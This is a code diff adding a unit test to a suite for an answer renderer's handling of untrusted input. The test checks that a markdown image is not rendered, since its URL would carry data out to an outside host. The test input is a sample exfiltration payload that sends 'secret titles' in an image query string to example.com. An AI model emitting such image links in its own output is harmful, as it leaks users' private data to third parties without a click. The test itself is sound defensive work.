@@ -282,6 +282,15 @@ describe("the answer's HTML (SPEC §4.9 untrusted input)", () => {
     expect(img).not.toContain('onerror="');
   });
 
+  it("loads no image or other media: an image address could carry data out with no click", () => {
+    const img = answerHtml("Done. ![status](https://example.com/p.png?d=secret+titles)");
+    expect(img).not.toMatch(/<img/i);
+    expect(img).not.toContain("example.com");
+    // The alt text stays, so the sentence still reads.
+    expect(img).toContain("status");
+    expect(answerHtml("![x](https://github.com/acme/widgets/raw/main/a.png)")).not.toMatch(/<img/i);
+  });
+
   it("still renders bold and code markdown", () => {
     const html = answerHtml("**bold** and `code`");
     expect(html).toContain("<strong>bold</strong>");
